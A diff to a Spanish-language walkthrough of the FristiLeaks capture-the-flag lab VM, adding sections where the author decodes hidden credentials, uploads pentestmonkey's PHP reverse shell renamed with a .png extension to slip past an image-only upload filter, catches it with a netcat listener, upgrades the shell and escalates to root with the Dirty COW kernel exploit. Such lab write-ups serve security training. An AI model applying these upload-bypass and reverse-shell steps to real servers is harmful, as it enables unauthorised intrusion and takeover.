@@ -20,7 +20,7 @@
 ## Descripción
 
 A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..
-VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76
+VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76 [080027A5A676]
 
 Filename: FristiLeaks_1.3.ova
 File size: 668 MB
@@ -189,6 +189,14 @@ Tomo nota del pie de web que indica que los Fristileaks son:
 @meneer, @barrebas, @rikvduijn, @wez3forsec, @PyroBatNL, @0xDUDE, @annejanbrouwer, @Sander2121, Reinierk, @DearCharles, @miamat, MisterXE, BasB, Dwight, Egeltje, @pdersjant, @tcp130x10, @spierenburg, @ielmatani, @renepieters, Mystery guest, @EQ_uinix, @WhatSecurity, @mramsmeets, @Ar0xA
 ```
 
+
+
+
+### Explotacion
+
+#### Explotacion de puerto 80
+
+
 Tras varios intentos de comprobar directorios se me ocurre poner el nombre de la maquina como directorio `http://10.0.2.7/fristi/` y obtengo una pagina con un login:
 
 ![alt text](image-9.png)
@@ -251,46 +259,73 @@ Ya que en el codigo se habla de base64 y viendo el formato voy a pasarlo por un 
 
 Abro CiberChef y le doy como Recipe FROM Base64
 
-![image](https://hackmd.io/_uploads/SkX4qu-XA.png)
+![alt text](upload_01a0f72bed2a5fdb6dd5936da14117c2.png) 
 
 El resultado parece ser un fichero PNG, le doy a guardar y obtengo un fichero de tipo .png
 
 al abrirlo tengo 
 
-![image](https://hackmd.io/_uploads/BJs_quZQ0.png)
-
-
+![alt text](upload_9810d8d36a93a26a82007efe68953d9e.png)
 
 eezeepz puede ser usuario ya que firmaba un mensaje y los caracteres de la imagen puede ser una clave. 
 
 Lo pruebo en el login.
 
-![image](https://hackmd.io/_uploads/r1gmGY-7A.png)
+![alt text](upload_47ae8225f775079fb640589365a22156.png)
 
 Y consigo acceder e iniciar sesion.
 
-![image](https://hackmd.io/_uploads/BJxSzY-70.png)
+![alt text](upload_3d6c04e230de712fe46a97d9842ac96d.png)
 
 Una vez iniciado sesión vemos que podemos subir archivos .jpg , .png , .gif.
 
-https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 
-Ahora editamos el php-reverse-shell.php
 
-![image](https://hackmd.io/_uploads/ryp4vtbQ0.png)
+Puedo usar la opcion de subir archivos para intentar añadir un fichero con una reverse shell que al ejecutarse en el servidor nos abra una conexion a nuestro equipo.
 
-En donde pone CHANGE THIS.
-IP -> La atacante, la nuestra.
-Puerto -> El que queramos.
+Para ello, ya que la maquina ejecuta un servidor apache que puede interpretar php buso una reverse shell en php que pueda descargarme para usarla en el objetivo.
 
-Como comprobais, no se puede subir archivo con extensión .php, pero si probamos a ponerle extensión .png delante, es decir: php-reverse-shell.php.png, si deja.
+Accedo a https://github.com/pentestmonkey/php-reverse-shell
 
-No olvideis hacer el ``nc -nlvp 443``
+![alt text](image-11.png)
 
-Ruta del archivo : ip/fristi/uploads/php-reverse-shell.php.png
+Realizamos la descarga del codigo:
+
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+![alt text](image-12.png)
+
+Configuro para que cuando se ejecute abra una conexion contra mi maquina kali
+
+![alt text](image-13.png)
+
+Para ello dejo a la escucha mi maquina kali mediante el comando
+
+```bash
+nc -nlvp 4444
+```
+
+En la maquina objetivo solo nos deja subir archivos de tipo imagen
+
+![alt text](image-15.png)
+
+Asi que cambio la extension del reverse shell dejando el archivo php-reverse-shell.php.png
+
+![alt text](image-14.png)
+
+Subimos el archivo y una vez subido hacemos una navegacion hacia el archivo, 
+
+![alt text](image-16.png)
+
+lo que provocara que en la maquina kali se nos abra una Shell de la maquina objetivo.
+
+![alt text](image-17.png)
 
 Una vez obtenida para tener una shell completa hacemos estos pasos:
 
+```bash
 script /dev/null -c bash
 Pulso CTRL + Z para dejar la zsh suspendida
 stty raw -echo; fg
@@ -298,14 +333,35 @@ reset xterm
 export TERM=xterm
 export SHELL=bash
 
+```
+![alt text](image-19.png)
+
+## Elevacion de privilegios
+
+Compruebo la version de linux que ejecuta la maquina objetivo:
+
+```bash
 uname -a
+```
+
+![alt text](image-20.png)
+
+Obtengo que esta ejecutando un kali
 
 2.6.32
 
 ![alt text](image.png)
 
-
 site:exploit-db.com Linux Kernel 2.6
+
+![alt text](image-22.png)
+
+![alt text](image-21.png)
+
+![alt text](image-23.png)
+
+![alt text](image-24.png)
+
 
 
 ![alt text](image-2.png)
@@ -347,3 +403,22 @@ run exploit : ./dirty
 
 nos pide clave pero le pulso intro y nos crea el usuario firefart con permisos root
 
+
+
+
+
+
+
+
+
+
+
+
+
+![alt text](<image (2).png>)
+
+![alt text](<image (3).png>) 
+
+![alt text](<image (4).png>) 
+
+![alt text](<image (5).png>)
